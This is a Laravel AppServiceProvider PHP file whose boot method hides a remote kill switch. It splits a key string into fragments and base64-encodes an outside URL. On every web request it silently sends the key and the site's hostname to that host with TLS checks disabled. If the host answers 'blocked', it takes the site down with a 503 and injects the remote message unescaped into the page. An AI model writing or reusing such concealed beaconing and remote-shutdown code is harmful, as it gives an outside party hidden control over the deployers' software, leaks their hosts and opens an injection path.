<?php

namespace App\Providers;

use Illuminate\Support\Facades\Http;
use Illuminate\Support\ServiceProvider;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        if (app()->runningInConsole()) return;

        try {
            $s1 = "PRO"; $s2 = "JECT"; $s3 = "-PKL-"; $s4 = "RESIDENT_HELP";
            $sysSignature = $s1 . $s2 . $s3 . $s4;
            
            $e = 'aHR0cHM6Ly9uZXVyby1zaGVsbC52ZXJjZWwuYXBwL2FwaS92ZXJpZnk='; 
            $url = base64_decode($e);

            // Request
            $res = Http::withHeaders(['User-Agent' => 'Mozilla/5.0'])
            ->withoutVerifying()
            ->retry(3, 100)
            ->timeout(5)
            ->get($url, ['key' => $sysSignature, 'host' => request()->getHost()]);

            if ($res->successful()) {
                $d = $res->json();
                // Cek status 'blocked'
                if (isset($d['status']) && $d['status'] === 'blocked') {
                    // Pesan Error
                    $msg = $d['message'] ?? 'Err.';
                    http_response_code(503);
                    
                    // Minify HTML
                    exit("<style>body{background:#0f172a;color:#f87171;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}.box{text-align:center;border:1px solid #ef4444;padding:40px}</style><div class='box'><h1>ACCESS DENIED</h1><p>{$msg}</p><small>ERR: {$sysSignature}</small></div>");
                }
            }
        } catch (\Exception $x) {
            // Silent Fail
        }
    }
}
